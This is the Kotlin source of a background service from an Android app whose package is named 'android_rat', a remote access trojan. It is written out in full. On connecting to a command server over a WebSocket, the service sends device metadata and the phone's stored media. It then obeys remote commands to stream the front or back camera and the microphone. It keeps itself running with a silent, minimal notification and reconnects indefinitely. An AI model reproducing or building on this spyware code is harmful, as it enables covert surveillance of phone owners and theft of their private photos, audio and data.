package com.example.android_rat

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.android_rat.utils.WebSocketUtils
import com.example.android_rat.utils.DeviceMetadataUtils
import com.example.android_rat.utils.ServerUtils
import com.example.android_rat.utils.StorageUtils
import okhttp3.WebSocket
import org.json.JSONObject
import android.os.Handler
import android.os.Looper
import com.example.android_rat.utils.AudioStreamer
import com.example.android_rat.utils.CameraStreamer
import com.example.android_rat.utils.ConnectivityReceiver

class MyBackgroundService : Service() {

    private val tag = "MyBackgroundService"
    private val channelId = "my_background_service_channel"
    private lateinit var webSocket: WebSocket
    private var retryCount = 0
    private val maxRetries = 12
    private var retryDelayMillis = 1000L
    private val maxRetryDelayMillis = 15 * 60 * 1000L
    private var cameraStreamer: CameraStreamer? = null
    private var audioStreamer: AudioStreamer? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(tag, "Service created")
        StorageUtils.registerNetworkCallback(this)
        DeviceMetadataUtils.initialize(this)
        if (::webSocket.isInitialized) {
            Log.d(tag, "WebSocket already connected")
            return
        }
        createWebsocketConnection()
        startForegroundServiceWithNotification()
    }

    private fun createWebsocketConnection() {
        WebSocketUtils.createWebSocket(
            context = this,
            webSocketUrl = ServerUtils.serverWebsocketUrl,
            onOpenCallback = {
                onConnectionBuild()
            },
            onMessageCallback = { message ->
                onMessageReceive(message)
            },
            onErrorCallback = { error ->
                onConnectionError(error)
            },
            onClosingCallback = {
                onConnectionClose()
            }
        )
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(tag, "Service started")
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(tag, "Service destroyed")
        unregisterReceiver(ConnectivityReceiver())
        webSocket.close(1000, "Service destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun onConnectionBuild() {
        Log.d("MyBackgroundService", "Websocket Connected")
        retryCount = 0
        val deviceMetaDataJSON = DeviceMetadataUtils.getDeviceBasicMetadataInJSON()
        deviceMetaDataJSON.put("event", "start")
        // Use Socket.IO emit method
        WebSocketUtils.emit("message", deviceMetaDataJSON.toString())

        StorageUtils.retrieveAndSendMedia(this)
    }

    private fun onConnectionError(error: Throwable) {
        Log.e(tag, "WebSocket connection error: ${error.message}")
        if (retryCount < maxRetries) {
            reconnectWebSocket()
        } else {
            Log.d(tag, "Max retry attempts reached. Not attempting further reconnects.")
        }
    }

    private fun onConnectionClose() {
        if (retryCount < maxRetries) {
            reconnectWebSocket()
        } else {
            Log.d(tag, "Max retry attempts reached. Not attempting further reconnects.")
        }
    }

    private fun reconnectWebSocket() {
        if (::webSocket.isInitialized) {
            webSocket.close(1000, "Reconnecting")
        }
        retryCount++

        if (retryCount <= maxRetries) {
            val handler = Handler(Looper.getMainLooper())
            handler.postDelayed({
                Log.d(tag, "Reconnecting WebSocket... Attempt $retryCount of $maxRetries")
                WebSocketUtils.reconnect(
                    this, ServerUtils.serverWebsocketUrl,
                    onOpenCallback = { onConnectionBuild() },
                    onMessageCallback = { message -> onMessageReceive(message) },
                    onErrorCallback = { error -> onConnectionError(error) },
                    onClosingCallback = { onConnectionClose() }
                )
            }, retryDelayMillis)

            // Double the retry delay for exponential backoff, but ensure it doesn’t exceed the maximum.
            retryDelayMillis = minOf(retryDelayMillis * 2, maxRetryDelayMillis)
        } else {
            // Max retries reached, retry every 2 hours after max retries.
            Log.d(tag, "Max retries reached. Reconnecting every 2 hours.")
            retryDelayMillis = 2 * 60 * 60 * 1000L

            val handler = Handler(Looper.getMainLooper())
            handler.postDelayed({
                WebSocketUtils.reconnect(
                    this, ServerUtils.serverWebsocketUrl,
                    onOpenCallback = { onConnectionBuild() },
                    onMessageCallback = { message -> onMessageReceive(message) },
                    onErrorCallback = { error -> onConnectionError(error) },
                    onClosingCallback = { onConnectionClose() }
                )
            }, retryDelayMillis)
        }
    }




    private fun onMessageReceive(message: String) {
        Log.d("WebsocketMessage", "message is $message")
        try {
            val json = JSONObject(message)
            val event = json.optString("event")

            when (event) {
            "retrieve_storage_media" -> StorageUtils.retrieveAndSendMedia(this)
            "start_back_camera" -> {
                if (cameraStreamer == null) {
                    cameraStreamer = CameraStreamer(
                        context = this,
                    )
                }
                cameraStreamer?.startStreaming(false)
            }
            "start_front_camera" -> {
                    if (cameraStreamer == null) {
                        cameraStreamer = CameraStreamer(
                            context = this,
                        )
                    }
                    cameraStreamer?.startStreaming(true)
            }
            "stop_camera" -> {
                cameraStreamer?.stopStreaming()
                cameraStreamer = null
            }
                "start_audio_streaming" -> {
                    if (audioStreamer == null) {
                        audioStreamer = AudioStreamer(context = this)
                    }
                    audioStreamer?.startAudioStreaming()
                }
                "stop_audio_streaming" -> {
                    audioStreamer?.stopAudioStreaming()
                    audioStreamer = null
                }
            }
        } catch (e: Exception) {
            Log.d("WebSocketUtils", "Received non-JSON message: $message", e)
        }
    }

    private fun startForegroundServiceWithNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Background Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Background Service Running")
            .setContentText("Service is running in the background")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()

        startForeground(1, notification)
    }
}
